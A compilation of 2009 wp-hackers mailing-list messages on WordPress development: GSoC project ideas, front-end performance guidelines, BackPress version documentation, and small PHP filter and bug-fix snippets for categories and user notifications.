whole point of the cache is to cache the static objects, not dynamic
pages and such. Can't cache those, and most plugins have nothing but
those.

Message-ID: <a6cfb8020903221627j29294abbqca1d8befae42d5d0@mail.gmail.com>

Hi Everyone!
Thank you for all of your previous feedback! There were many people who said
that Wordpress is already a CMS, but it is also difficult to market
Wordpress as CMS, since Wordpress is usually well known as a Blog system. I
thought for a second to define the Content Management System. Wordpress has
already "manages" content, which is including the blog itself and other part
of the website. Wordpress however, unlike the other CMS system, does not
allow the user to customize the static pages easily like the CMS that I
described on my proposal (i.e. http://sci-vi.calstatela.edu/ -- Joomla). If
you see at the home page are generally always look like boxes, so I thought
wouldn't it be nice to extend the capability of the widgets to do that! In
which would also extend Wordpress into a CMS. I just updated my proposal,
with my proposed schedule, and I would love to get another comments from all
of you.

*URL:* http://laksmono.com/2009/03/18/wordpress-cms/
*password:* wordpress-gsoc

I also have personal experience when I was about to recommend wordpress as
the homepage for our ACM student chapter, now it's here:
http://acm.calstatela.edu/wordpress/ now it looks a little messy because of
the bureaucracy in our school, they never set it up correctly, and won't
ever allow me to set it up, but I also have the same experience as many of
you, our advisor literally just say that he doesn't want a blog system.
Though, my original idea was to allow all officers to be able to write news
updates, and other stuff easily on the website.

Let me know,
Thanks a lot!

I think this is a brilliant idea Edward and its something that is
needed by many sites.

Limiting an author to a category crosses from workflow into user
access control, which is something I would prefer to see in the core.
The rest is definitely workflow process though.

I used it a lot when I was updating the Function Reference on the Codex.
I was not familiar with the location of each function and a local
version of the Xref along with my browser page search helped me to find
the files I needed to parse. I also liked using hyper links to read
files rather than having to open them in my editor.

Maybe this will fix your problem:

function sanitize_title_with_translit($title) {
       global $tr;
       $new_title = strtr($title,$tr);

       return ($new_title == $title) ? $title : $new_title;
}

I've simply added a check so that the slug isn't converted twice.

Message-ID: <304395d50903231322v713322acg2926d4592421370@mail.gmail.com>

Hello,

    I am Shashank Agrawal, a Computer science student at IIIT-Hyderabad
(India). I am interested in working for WordPress through GSoC this year. I
want to discuss a project idea and have your feedback on it*.

Project: Add collaborative editing features for a blog-post.*******
*
*This will allow people to edit and read a shared blog-post working at
different places. People will be able to contribute to the same blog in the
same post.

A person will be able to create a blog-post in "shared mode" and invite
people with whom he wants to share it. The in-draft post can be read by
other users while being written by one*. *In between, the users can use
switches to indicate their willingness to write or give the writing
permission to others.

I have chalked out some of the details. Would like to discuss them here:

- The model can be either a p2p (the current author can decide whom to give
permissions to) or a master-slave (master giving the permission for writing
everytime) **or we can even include flags for both.* **

*- Other options might include who actually commits/saves the data, can
non-authors undo the changes, etc.

- What happens when one of the clients encounters some problems - do we keep
a temporary file on system? or do we **transfer the whole file again when
(and if) required.

- Can we include invitations/acceptance of files through mails or other
communication channels?

- How the network speed will affect the performance?

- Minute details like deleting the text at one end, etc.


I would like to have your comments on the idea.
**

Cheers!

Subject: [wp-hackers] Front End Performance in WordPress
Message-ID: <49C7F0BC.7030206@poolstudent.com>

This is my first post to the list, so if I've done something wrong I 
apologize in advance.  It's a long one, but I hoe it will spur a great 
discussion.

WordPress performance is talked about all the time, but much of the 
discussion seems to be on the performance of the back end, while the 
bulk of the improvement opportunity is in the front end.  Steve Souders 
excellent book High Performance Web Sites, published by O'Reilly lists 
14 rules that if followed can boost front end performance on websites 
substantially.  Most do not require any significant or complex efforts.  
However, most are difficult to impossible for a technically proficient, 
let alone an average blogger, to implement in WordPress.

I used Steve's rules to optimize my site before I went to WordPress and 
they worked extremely well.  My site performed spectacularly.  Once I 
moved to WP, the speed dropped greatly.  WP is doing more, I'm ok with 
some of the slowdown, but most of the performance drag is due to poorly 
optimized code from the perspective of the front end.

Much of the improvement potential is in changing the way some things are 
done in plugins.  I know plugins are written independent of Automattic 
and WordPress, but it seems to me that if there were guidelines on how 
plugins could be written to maximize performance, and if WP had a 
structure supporting same, that plugin developers would do it 
voluntarily, sine they believe in WP and genuinely want the best end 
result for the end user. 

I don't claim to be a great developer, and I am relatively new to 
WordPress, but I think these will at least make the ideas clear.  
Implementation I gladly leave to much more capable hands.  The numbers 
refer to the rules in Steve Souders book High Performance Web Sites.

*#1)  Make Fewer HTTP requests:  *More than a few WP plugins have 
multiple Javascript files.  Best practice would be to combine these into 
one.  Average round trip to the server is between 0.1 and 0.2 seconds, 
so picking up a few begins to make a difference.

Combining JS files from multiple plugins and core WP would save 
additional round trips, but becomes more difficult to manage.  People 
will have different opinions on the tradeoff between ease of management 
and performance.  I'm not suggesting that performance always wins, I'm 
just saying that there is a lot of performance improvement potential to 
be mined here and in the other rules that clever development might turn 
into gold.

Another place to save is in plugin-specific CSS files.  A large number 
of plugins have these, some more than one.  Combining these into 
STYLE.CSS in the theme saves more round trips.  This one is more 
problematic, since as a plugin is improved, additional lines added to 
the plugin specific css file would need to be added to STYLE.CSS.  I 
think this is manageable, since it probably doesn't happen often. 

If a plugin is deactivated, the plugin specific css code in STYLE.CSS 
should be purged.  I suppose this could be automated is all plugin 
specific css code began and ended with unique values, but this is 
probably too much trouble.  Bloggers could run a plugin for a little 
while and decide if they like it, use the current behavior, then switch 
to high performance behavior if they choose to keep the plugin active.

When a theme is replaced for a new on, the changes would have to be 
redone, but with the right process this should be automatic.

Social Bookmark plugins and others with multiple small graphics should 
be strongly encouraged to use sprites for said graphics.  Every one is 
another round trip, even when in the cache (more later). 

*#2)  Use a Content Delivery Network:  *This doesn't have to be a paid 
service type CDN to get the benefit, just a subdomain, free to most 
bloggers.

If WP had a standard way for a blogger to store his/her CDN subdomain 
(and optionally directory, one for each plugin) then if the blogger 
checked a box in the setup of a plugin, that plugin would know to use 
install and use the copy of static files in the CDN.  The plugin 
developer would be in charge of determining which files were static.

*#3)  Add an Expires Header:  *By doing this, the round trip to the 
server to determine if the file in cache is current is eliminated.  It 
greatly enhances the value of having things in the cache.  Especially in 
a blog, where so many things are the same from page to page, this 
savings can be quite significant.  By providing a standardized .htaccess 
file for bloggers on an Apache server (and other comparable 
documentation for other common servers that support this), WP greatly 
improves the value of the pseudo CDM described above, since the files in 
it will be those that aren't changing.  Since plugin developers are in 
control of what goes into the pseudo CDN (if the blogger has chosen to 
use one) they are in a position to introduce a new version of a file 
they though wouldn't change by issuing it with a new name.  WP could 
suggest a standard approach to this, like using a version number or a 
date at the end of the filename.

*#4)  Gzip Components:  *WP already supports Gzip, great.  However, by 
providing a structure and standard mechanism, more files could be 
Gzipped for those choosing to do so.  JS and CSS files fall into this 
category, again, optional.

*#5)  Put Style sheets at the Top:* This is already enhanced by the work 
in #1 to combine CSS files into STYLE.CSS.

*#6  Put Scripts at the Bottom:  *Some scripts do this now, but if WP 
encouraged the community to offer this as an option, more would do so, 
and many bloggers would take them up on it, and gain performance because 
of it.  Sometimes this doesn't work, and moving the Javascript up can't 
be helped, but all plugins shouldn't avoid this because a few would have 
problems.

*#7  Avoid CSS Expressions:  NA*

*#8  Make Javascript and CSS External:  *This is already done by most, 
but it certainly wouldn't hurt to make a point of how much t helps.

*#9  Reduce DNS Lookups:  *Some plugins rely on JS code from 3^rd 
parties, like Google, and go get that code repeatedly from those sites.  
I suggest making it optional for the blogger to choose to keep that 3^rd 
party code on his/her own server.  This avoids DNS lookups and may 
improve download performance as well.  The JS file for Google Analytics 
is a case in point. JS libraries are another.

*#10)  Minify Javascript:  *Plugin developers should be strongly 
encouraged to minify their JS files.  They are in the best position to 
verify that they work after processing.  WordPress could help by either 
recommending a preferred product to use or even making it easier and 
providing it.  Many do this but all should.  Some still won't but so what.

*#11)  Avoid Redirects:  NA*

*#12)  Remove Duplicate Scripts: * This is partially solved by 
implementing #3, and can be enhanced further through the use of script 
management.  See Souder's book, High Performance Web Sites, page 87.

*#13)  Configure ETags:  *I confess I don't really understand this one.

*#14)  Make Ajax Cacheable:  *Probably not relevant at this time.

John,

though I agree with you that it would be good to teach people about 
this, but you'll never get any guidelines like that enforced... (and 
sometimes there's just no other way because companies like Google f*ck 
up stuff in how they do their API's, like with FriendConnect)

Best,
Joost

Peeps,

Anyone knows where dbDelta() comes from? Is it something straight from
a WP contributor, or was it in first place an open source snippet that
was wordpressified?

I need for a non WP project a function that would be able to upgrade a
table structure, much like dbDelta() does. Any hint? Can find anything
but $200 tools online...

If the plugin is correctly using the script queuing functions, this is
largely a solved problem, as dupe scripts won't get sent twice.

I guess you need to ask him where it came from

I think WordPress sends Last-Modified headers only for feeds.

Austin & Otto,

I'm not sure we're talking about the same thing, re:expired headers.  
Many plugins have files that get included in posts and/or pages, graphic 
files of various favors, .css & .js files, etc.  It is rare in my 
experience that these files have expired headers.  Because they do not, 
even though they'll be in the cache for all pages after the first, there 
is still a round trip made to the server for each one of them to verify 
that the file in the cache is the most current one.  Though the 
turnaround time for these round trips is small, they add up quickly when 
there are many of them, as there often are.

I see two straight-forward ways to fix this, both of which would require 
the developer's voluntary cooperation (not a problem, as I said in my 
original email).  Also, each could easily be subject to an opt-in by the 
blogger.  The default should be to keep the behavior as it is today.  I 
don't claim these are the only ways, or the best ways, and I'm more than 
open to suggestions for improvements.

First, the plugin could come with an optionally included .htaccess file 
that would take care of the relevant files for that plugin.  It could 
include alternative files or instructions for non-Apache servers that 
offer similar capability.

Second, and strongly to be preferred IMHO, would be to have a single 
location, defined by the blogger, where these files would be kept.  Each 
plugin could create their own directory underneath that directory for 
their files to avoid files of the same name overwriting each other.  The 
whole structure could have a .htaccess file (or equivalent for other 
environments) to expire all files of the various graphics formats, .css 
& .js.  Other appropriate formats also could be added.  .css files are 
more problematic, since bloggers may wish to modify them to fit better 
with their theme.  They would want to do so before putting the file into 
the expired headers location, since if they did modifications after, not 
everyone would see them.  Since .css files may be affected by other 
rules, they may not be in the list of files to be included in the 
expired headers location.

As plugin developers upgrade their apps, they'll need to change the 
names of these static files for those that have changed, to avoid users 
loading an out of date version from their local cache.  The developer 
could use a version number or date to append onto the filename, and that 
portion would change appropriately.  The upgrade would delete the old 
after installing the new was successful.

I'm pretty sure that nothing like this exists currently, or at least if 
it does not very many plugin developers use it.

If the second approach is taken, and if that single location is located 
in a subdomain, then performance is boosted again because of the 
increase in parallelism made possible by the second domain.  Instead of 
2 files at a time being downloaded by the browser, now 4 files can be 
downloaded simultaneously.  For a blog with a number of plugins, these 
two improvements would be quite significant, for what seems to me to be 
a relatively small effort.  It would take time before a majority of 
plugin developers did this, but with WP standardizing on a technique and 
publicizing the potential benefits (they are quite real and quite 
significant) I think many would comply quickly.  The bloggers who care 
would then favor plugins which followed these front-end performance 
guidelines and that pressure would cause other developers to follow suit.

Joost,

I agree that guidelines such as those I've recommended would not be 
enforced.  I don't think they should be.  But with an appropriate 
standard framework for implementing a set of front-end performance 
guidelines, those plugin developers who wanted to would see that they 
could do so in a standard way, and that WordPress was behind them in 
their effort to do so.  WP could publicize the framework, after it was 
created, and could include some sample tests to show the improvement 
that was possible.  These would not be definitive, as every blog is 
different, as is every client, but a representative sample, say a blog 
with 2. 5 & 10 typical plugins, on dial-in and cable modem clients.  
When users see that pages can go from loading in 4 seconds to 2 seconds 
they'll clamor for their favorite plugin developers to participate in 
the program.

I am suggesting that this be entirely voluntary on the part of plugin 
developers, and that each one that chooses to offer these enhancements 
have an option for the blogger to opt-in in order to get the front end 
mprovements.  If the blogger does not, then the plugin would continue to 
operate as it does now.  I realize that this creates extra work for 
plugin developers, and that many may choose not to do it.  However, if I 
am right about the performance improvements to be seen in the rel world 
environment, I believe tht many will do so, and more will be driven to 
by their downloaders.

I confess I do not understand your reference to Google and their 
non-standard approach to APIs.  I don't know anything about Friend 
connect.  Most of the changes I am suggesting will not require any 
cooperation from any third party, just the blogger and the plugin 
developer, once a standard framework has been published and blessed by 
WordPress.

Otto,

That's great,  I'm not looking to re-invent something that's already 
solved.  I was not aware of it, and I know that some developers at 
least, aren't doing this properly, because I have seen duplicate scripts 
loaded before in WP.  Clearly this is the fault of the developer, 
though.  If the is a framework put forth for implementing front end 
performance improvements, it should include a section on how to use the 
existing script queuing functions to avoid duplicate scripts.

There's plenty of documentation on it, on the codex and in various
posts across the web. It was one of the major features of 2.5, I
believe.

http://www.google.com/search?q=wp_enqueue_script

The CSS enqueue stuff is relatively new though, and only used in the
admin side of things, I believe.

It will be done automatically by using improved versions of
wp_enqueue_script and wp_enqueue_style.

Why does this framework have to be blessed by WordPress?

The only real endorsement you need is from plugin authors. If it really
is a good idea (and it sounds like one) then there is no reason to wait
for some endorsement from on high.

The WordPress Codex is a wiki. Anyone can add documentation. Sure,
others can also take it down, but we rarely remove good stuff and you
can watch your page to see what changes are made.

Hello,

any one have a idea?
I will display none for a categories in edit post on admin-area.
I have not found a hook for the select and think, it is possible to display
none with css or javascript an load admin.
A this is not ao easy for a users with many categories in wordpress.

It is possible to hook an the meta box for categories and reduce the select
for categories ind the meta box on edit post?

Thanks for your ideas
Best regards

@Alan J Castonguay

Thanks for your feedback. The differences between category template and my idea are:

1. In the category template, a post's theme will be determined by it's category. In my idea, an interface will related to many category, for example Web Programming interface will related to these categories: XHTML, CSS, JavaScript, PHP, JSP, AJAX, etc. (the relation between interface and category is one to many).

2. Every interface will have it's own feed.

3. The guests can still visit the blog as a whole. All posts will be displayed with theme that selected for interface Whole if a guest visit the blog as a whole. The guests can still visit every interface in the blog using subdomain or subdirectory, but they can also visit the blog as a whole by using main domain. In short, an interface is a subblog, which consists of posts within certain category/categories.

My idea can still be extended, therefore I'm expecting suggestions from all of you. By the way, Alan, do you know a plugin to do a category template?

Best regards,

Sigit Dewanto

You could use a little bit of jQuery to only show a given number of
categories.

Message-ID: <49C8E2A4.4020108@htcomp.net>

Hello All,

When was BackPress first added to WordPress? (Which WordPress version 
number.)

I ask because the "Since" version information in the BackPress source
files uses BackPress version numbers. I have been including a Since
section on the Function Reference pages and I fear the BackPress version
numbers would only serve to confuse most users.


I could set the Parser to do something like this:

Since: 2.7.0 (BackPress version: r79)


The BackPress files include:
  functions.wp-styles.php and
  functions.wp-scripts.php


Thanks,

Charles Clarkson

Thanks for your answer.
Yes, i use now a javascript to display none categories. A this is hard for
the adaptation, the blog have aver 700 categories and hope i can reduce the
select-query with a hook.

It looks like the functions included in those files were added back as
far as 2.1.  However those files were added in 2.6.  Previously the
functions were in wp-includes/script-loader.php

Hello,

I thought about ideas in GSoC 2009, and I selected MPTT (Modified
Pre-order Tree Transversal). I read about it (how to add nodes, delete
nodes and retrieve nodes), but I have a small question: What are the
limits on the idea?.

I think to implement the idea, I have to write the code of the MPTT
algorithm (for categories and pages), a code for list categories in
templates, and make a utility to take advantage of this (on interface
admin, i.e.: ajax interface to manage categories and pages).

So... What do you think about "my limits" of the idea?

Thanks ;)

PS: Where are the emails of mentors?

This is a kind of interesting idea. Reminds me of this:
http://thedeadone.net/download/tdo-tag-fixes-wordpress-plugin/

In short, an interface is a subblog, which consists of posts within certain category/categories.

In keeping with the way the rest of WP works, it seems like an
"Interface" as you're calling it would just be a customized query that
contained a certain intersection (or list) of categories and/or tags.

> My idea can still be extended, therefore I'm expecting suggestions from all of you. By the way, Alan, do you know a plugin to do a category template?

A single category can have a custom template just by including a file
called "category-ID.php" in your theme's directory, where ID is the
numeric identifier for that specific category.

>From what I understand of the MPTT idea (which I'm also applying to work
on), you would basically want to create the MySQL structures, algorithms for
building/rebuilding the tree whenever you insert/remove/change a node, and
algorithms for retrieving the data.  Once you have the algorithm for data
retrieval, it's just a matter of plugging it in wherever pages and
categories are currently queried in order to speed up that process.  In
other words, it is inherently a background speedup such that the interface
would not change at all, only the speed with which WordPress executes.  Any
new or extra interface features, like an AJAX interface, would be bonuses.
:)

I hope that helps in some way?

It seems to me like this is just custom category templates, and
perhaps a bit of in_category messing about in the single post
template. All theme work, in other words.

> 2. Every interface will have it's own feed.

All categories already have their own feed. For example:
http://sigit.web.ugm.ac.id/category/wordpress/feed/

In short, an interface is a subblog, which consists of posts within certain category/categories.

Seems to me like the simplest way to execute your idea would be to
make a category.php file with a big if (is_category(x)) type of
structure in it, which them provides a different view/look/feel to
that category archive. Similar work in the single.php provides the
same sort of thing.

Hello,

any one have a idea?
I will display none for a categories in edit post on admin-area.
I have not found a hook for the select and think, it is possible to display
none with css or javascript an load admin.
A this is not ao easy for a users with many categories in wordpress.

It is possible to hook an the meta box for categories and reduce the select
for categories ind the meta box on edit post?

Thanks for your ideas

Personally I think this kind of thing might be more than WP really
needs. While it would be pretty cool to have a full-on group editing
thing It seems like it would be really complicated and would replicate
a lot of functionality already defined in the existing
Roles/Capabilities system of WP. Who can edit a post is already
controlled based on roles, so I don't see why it should be much more
complicated than that for any given post.

I think if anything what WP needs is just a cleanup/enhancement of
what already happens when you edit a file together. The last few
versions have added things like the message "Be careful, someone else
is currently editing this post" (not a direct quote) or the one "There
is an autosave of this post that is newer than what you are looking
at". I think you could take these simple things to the next level and
it would cover a lot of the ground of your proposed system without
imposing such a massive paradigm shift as to how a WP workflow flows.

Some ideas:

  * when someone else is editing a document have a message at the top
that reloads regularly and shows some kind of DIFF view of what they
have changed
  * useful warning messages if WP is about to autosave in a way that
will overwrite the recent changes made by someone else.

Basically just working through the existing system and adding in more
useful shared work messages and making it easy to choose between
different versions of edits when they come up.

A great idea..
In this way, we can actually give users the option of writing blog posts
together.
Just that the idea of showing warning messages etc. implies that we don't
want to encourage writing people together.
So, I would like to modify this mechanism and instead give them options to
select from (in form of buttons, menus, etc.) and achieve a nice environment
to write posts together.

Soory for my bad english.

On the post-page in admin, the meta box category list all categories with
wp_category_checklist().
I will exclude several categories on this list. All categories have an id
and a class, so it is possible exclude with javascipt or css. I will exlude
several categories in the select-query of wp_category_checklist().

Thanks a lot

BackPress is more of a two way thing.

It has grown out of the fact that bbPress started by taking some of  
the core WordPress code and it is an attempt at pulling out the stuff  
that is sharable between projects.

Maybe one day WordPress will use BackPress as an svn:external in the  
same way bbPress does.

The limits are really where you want to set them.

But don't forget your proposal needs to be realistically achievable in  
the available time.

The mentors don't want to really start email discussion at this point.

The best places for discussion are likely this list, the #wordpress- 
dev IRC channel or the feedback the mentors can give on your  
application once it has been made in the gsoc webapp.

Subject: [wp-hackers] Possible bug in the function human_time_diff()
Message-ID: <74b84aa30903241604lf1c5249h4376d14664fc66fc@mail.gmail.com>

Hi -

I think I am seeing a weird behaviour when I use human_time_diff()
function to show time, using the Codex example as below:

<?php echo human_time_diff(get_the_time('U'),
current_time('timestamp')) . ' ago'; ?>

A couple of minutes after publishing a post, the time stamp was
showing the time in *hours* ago. And it was like 5 hours ago---perhaps
the difference between my current location and my site server. With
every passing hour, it counts down, and at some point, I think when it
crosses the abs time points, it begins to count up again.

At say 5 minutes after local publish time, it looks like '5 hours ago'.
At say 1hr 2 minutes after local publish time, it looks like '4 hours ago'
.
.
and so on.
.
.
At some point, the count begins upward again.

Also, I never saw the time in minutes.

Could somebody tell me if this is indeed a bug in the function, or am
I using the Codex example of human_time_diff wrong? FWIW, the time in
the Admin area (Edit Posts) appears to show it correctly (in human
readable time).

Subject: [wp-hackers] WordPress Version Numbers for BackPress

Message-ID: <49C98AFF.1040403@santosj.name>

I think the difficulty I had was that I don't see BackPress as part of 
WordPress. The question, to me, is not that, "This is part of WordPress 
and should have a WordPress @since info," but more, "This is BackPress 
and therefore has a BackPress revision number[1] of when it is added." 
More to the point, the @since tags aren't important enough to really 
think too much [9].

The problem with saying, "@since 2.7.0 (BackPress version: r79)" is that 
it becomes ambiguous. Which 2.7.0 are you referencing? bbPress will 
eventually have a 2.7.0 and to those users of bbPress using that 
function, will think that the 2.7.0 refers to bbPress as opposed to 
WordPress. It is problematic, indeed, but unless phpDocumentor allows 
for multiple @since tags (I have not yet tested this, because there 
wasn't much of a need for it).

Again, I see BackPress as a separate library, and like Peter Westwood 
mentioned, BackPress may eventually be literally a separate library as 
in it will be an external and added to the downloads and SVN checkouts. 
In this case, WordPress version numbers would not make any sense. You do 
not add @since to other external libraries[2]. The only exception to 
this was Kses[3].

I believe the confusion was that some functions inside of BackPress 
originated in WordPress and therefore should have a WordPress @since, as 
WordPress is the "owner" of that function. I think this is confusing and 
a practice I hope does not continue when bbPress is documented[4].

That being said, this only works if BackPress is continued to be 
documented. This I think is further complicated that when WordPress 
inline documentation is ported to BackPress, it will also keep the 
@since information of WordPress. This will not be the case for bbPress. 
I'm unsure of the best solution for this that would be quick and 
simple[5]. I think phpDocumentor might have some limitations to only one 
@since tag, but I'm unsure of whether is the case[6]. I forget if I 
tried it, but if I did, then it most not have worked or I would have 
used multiple @since when I came across backported functions.

Well, I guess the quick and simple is to keep the WP or use "@since 
WordPress 2.7.0 (BackPress: r72)" but I fear that the solution will 
become convoluted as bbPress version is added and future -Presses. I 
would rather explore whether you can have multiple @since phpDoc tags 
and have one for WordPress, BackPress, and bbPress. The other solution 
would be to just have notes in the Codex as to when the BackPress 
function was added to WordPress, or a little history tidbit about how 
the WordPress function was ported to BackPress and then used in 
WordPress [7].

Jacob Santos

[1] BackPress does not have any version number, because there has no 
been any public release of it. This really just means that it is alpha 
software. Really, all the @since info that has r### will have to be 
updated when there is a release to whatever version that release is 
labeled as. The only point of it from my perspective is that there has 
to be some reference point for those using the library as a 
svn:external. That said, those who are using the library, will always be 
using the latest version and therefore will always have every function 
and class. Thus the reversion numbers and @since is irrelevant. It is 
only when there is a release to work off of that the @since info will 
take hold for BackPress. Even then, all of the @since info will need to 
be updated to reflect that version release.

[2] That would be wrong by the way to do, because it is entirely 
unlikely the core devs of the external projects will accept something of 
a patch exclusive to and for WordPress.

[3] Which I believe was dead before it was picked up and modified so 
much in WordPress, that I felt the current implementation to be an 
acceptable fork of the library and therefore needed documentation in 
WordPress.

[4] Documenting WordPress was mostly an experimental project and there 
are inconsistencies as better ways of expressing information was 
explored and then found to not work as well in future additions.

[5] I want to point out that this is mostly a bikeshed argument in that 
there isn't a "right" answer or solution. There are many working 
solutions and by no means is the current one the "correct" or "best" 
one. By all accounts, that does not appear to be the case, since it 
assumes isolation and WordPress isn't isolated in this instance. This is 
more of BackPress problem and more of one that is not important compared 
to the @param, short and long descriptions. If it was known that it 
would have been such a pain in the ass to maintain later, I wouldn't 
have spent such a long time worrying about it and adding it.

What I'm trying to say, is that whatever you feel is the way to go, then 
I will stand behind it and help in any way I can.

[6] Even if phpDocumentor only accepts one, having the information in 
the inline documentation and available for your project Charles should 
suffice for the future.

[7] I'd like to think that two years from now, people will be looking 
back at this effort and get as much useful information as possible. 
Perhaps also the information will be part of some quiz or useless 
information used to impress friends [8].

[8] Those friends would have to be worthless as humans and I hope you 
walk over them wherever you go.

[9] The @since tags are only important to those who care about the 
minute details and want to maintain backwards compatibility. That said, 
they will most likely be wrapping the function in "function_exists( ... 
)" and not worrying about the exact version the plugin or theme is 
running on.

Frank:

I'm still not 100% sure exactly what you want since you didn't get examples of categories, but I think the following *might* give you what you need. I tested it in the templates functions.php file but it will likely work the same in a plugin.  I used a hypothetical addition to the were clause that limits to categories with the slugs 'news', 'charity', and 'events':

   add_filter('list_terms_exclusions','my_list_terms_exclusions');
   function my_list_terms_exclusions($args) {
      $where = " AND t.slug IN ('news','charity','events')";
      return $where;
   }

This is the SQL statement that it is adding to the WHERE clause:

  SELECT 
    t.term_id,
    t.name,
    t.slug,
    t.term_group, 
    tt.term_taxonomy_id,
    tt.term_id,
    tt.taxonomy,
    tt.description,
    tt.parent,
    tt.count 
  FROM 
    wp_terms AS t 
    INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id 
  WHERE 
    tt.taxonomy IN ('category') AND 
    tt.count > 0 

Thus the SQL statement will look conceptually like this when the above filter is in place:

  SELECT 
    t.term_id,
    t.name,
    t.slug,
    t.term_group, 
    tt.term_taxonomy_id,
    tt.term_id,
    tt.taxonomy,
    tt.description,
    tt.parent,
    tt.count 
  FROM 
    wp_terms AS t 
    INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id 
  WHERE 
    tt.taxonomy IN ('category') AND 
    tt.count > 0 AND 
    t.slug IN ('news','charity','events')

Of course that filter might cause unexpected side effects elsewhere so you'll need to test it throughout and also you might need to ensure that the action is only called where it is needed.

Let me know if this is actually what you needed or if not please explain why not and give some examples of what you'd want to see.

Hope this helps.

Soory for my bad english.

On the post-page in admin, the meta box category list all categories with
wp_category_checklist().
I will exclude several categories on this list. All categories have an id
and a class, so it is possible exclude with javascipt or css. I will exlude
several categories in the select-query of wp_category_checklist().

Thanks a lot

Mike, Frank,

yepp there are side effects. The main "category" management page is 
affected with this filter. (categories.php)

Hello Mike,

thanks for the idea with the filter, works fine!

Example:
add_filter('list_terms_exclusions','my_list_terms_exclusions');
   function my_list_terms_exclusions($args) {
      $where = " AND t.slug  NOT IN ('2005','2006','2007','2008')";
          //$where = " AND t.slug not like ('eid-%-%-2008')";
         //$where = " ";
      return $where;
   }

Message-ID: <6202bd0903250829r31230e2eqcf602146a9fcee9b@mail.gmail.com>

Hi, I was wondering about how would designing a more intricate and
thoughtful searching mechanism be? Appreciated? No comment?What I had in
mind was that there would be a new addition to the current database tables
so that the administrator could prioritize a certain post to show up on the
top more likely. Also so that commenters could help to prioritize it. I was
also thinking of creating a new table that would keep track of what people
search for and click on, to better help people find what they want. The
basic meta options of looking through the title, body, by who, and by date
would also be included. I was also considering a type of fuzzy logic that
would help people find what they want, such in a way that Google does "did
you mean...".

I was also wondering how a better spam filter would help. I know I have the
problem of spam bots coming and spamming, thus I had to disable comments. I
know that adding a image detection would help, but I did not want to resort
to that as it would discourage people to comment. (But then again, one might
consider that if they're not willing to spend 5 seconds typing in the words
then their words shouldn't be viewed by the world wide web =P.) I was
thinking of implementing a search-feature as I mentioned above that, one
that would keep track of what the moderator has marked as "spam" and try to
come up with some semantics or patterns that would better distinguish
comments from with merit or worthless. I was also considering that if a
person was going to moderate it, that certain comments prioritize by what
the content. If it's obviously spam or meaningless trash, it would be
automatically deleted (or put on the bottom of the list depending whether or
not the user puts that option). If it has certain keywords or "spam words",
it would be put lower onto the list.

Thanks guys for your time reading this! I appreciate any comments I could
get back ^^;

Hi,

I'm Varuna Jayasiri, a second year undergraduate student at University of
Moratuwa, Sri Lanka. I am interested in working in the improved search
feature project idea for wordpress.

I would like to know whether this project should be developed as a
completely new feature (a new search UI/API and back end search facility) or
as a set of modifications to the WP_Query class to enable more ways to
search with a new search UI.

Also are there any resources which I should go through in order to get a
better understanding about this project.

Thank you
 Varuna

This would be a good start:

* Create an MPTT_Walker class with the same API as Walker.
* Add MPTT fields to taxonomy tables.
* Convert Category_Walker to use MPTT_Walker
* Profile read and write performance to see how well MPTT behaves.

Message-ID: <6225fcee0903251143ibd511cfx17c53005db82c3c3@mail.gmail.com>

Dunno if it was just my distribution, but WP 2.7.1 was not sending any email
to new users as I registered them.
I tracked this down to line 167 in wp-admin/includes/user.php:

    if ( $update ) {
        $user_id = wp_update_user( get_object_vars( $user ));
    } else {
        $user_id = wp_insert_user( get_object_vars( $user ));
167>    wp_new_user_notification( $user_id );
    }

Seems this should be wp_new_user_notification( $user_id, $pass1 );

Also, i found that wp_new_user_notification($user_id, $plaintext_pass = '') was
only sending to admin because the function will return before sending to the
new user if it is not supplied a $plaintext_pass. Some error handling should
be inserted here.

Should I post to trac?

Gerhard: 

Thanks for noting that. 

That brings up a question I have for the list. WordPress' filter and action hooks are incredibly flexible but can also result in far too easy creation of unexpected and side effects. I've numerous times made a change using a filter only to find out that it "broke" something in a completely different part of the site and of course those breakages are usually found by the client and then they get frustrated with me for breaking "that which already works" and ask me "why were you working on that part when you were supposed to be working on this other part?"  And in the case of releasing a general purpose plugin, such side-effects can cause a real nightmare for end-users of the plugin.

Is there a more robust way to pinpoint and isolate these kind of changes?  I've reverted to testing the URLs via $_SERVER['REQUEST_URI'] but that just doesn't feel very robust, and in the case of a widget isn't even a solution.  How do you guys address these issues, and is there even a good way to do so?

Mike, Frank,

yepp there are side effects. The main "category" management page is 
affected with this filter. (categories.php)

Re: [wp-hackers] Dispay none for different categories






Frank:

I'm still not 100% sure exactly what you want since you didn't get 
examples of categories, but I think the following *might* give you what 
you need. I tested it in the templates functions.php file but it will 
likely work the same in a plugin.  I used a hypothetical addition to the 
were clause that limits to categories with the slugs 'news', 'charity', 
and 'events':

   add_filter('list_terms_exclusions','my_list_terms_exclusions');
   function my_list_terms_exclusions($args) {
      $where = " AND t.slug IN ('news','charity','events')";
      return $where;
   }

This is the SQL statement that it is adding to the WHERE clause:

  SELECT 
    t.term_id,
    t.name,
    t.slug,
    t.term_group, 
    tt.term_taxonomy_id,
    tt.term_id,
    tt.taxonomy,
    tt.description,
    tt.parent,
    tt.count 
  FROM 
    wp_terms AS t 
    INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id 
  WHERE 
    tt.taxonomy IN ('category') AND 
    tt.count > 0 

Thus the SQL statement will look conceptually like this when the above 
filter is in place:

  SELECT 
    t.term_id,
    t.name,
    t.slug,
    t.term_group, 
    tt.term_taxonomy_id,
    tt.term_id,
    tt.taxonomy,
    tt.description,
    tt.parent,
    tt.count 
  FROM 
    wp_terms AS t 
    INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id 
  WHERE 
    tt.taxonomy IN ('category') AND 
    tt.count > 0 AND 
    t.slug IN ('news','charity','events')

Of course that filter might cause unexpected side effects elsewhere so 
you'll need to test it throughout and also you might need to ensure that 
the action is only called where it is needed.

Let me know if this is actually what you needed or if not please explain 
why not and give some examples of what you'd want to see.

Hope this helps.

Soory for my bad english.

On the post-page in admin, the meta box category list all categories with
wp_category_checklist().
I will exclude several categories on this list. All categories have an id
and a class, so it is possible exclude with javascipt or css. I will 
exlude
several categories in the select-query of wp_category_checklist().

Thanks a lot

Why add a new table for that. Why not use wp_postmeta?

Depends on what you are filtering and what for.

If you are filtering for specific use-cases then the best thing to do  
if to only add_filter in those specific cases.

Some of the filters, especially the ones to do with SQL queries can be  
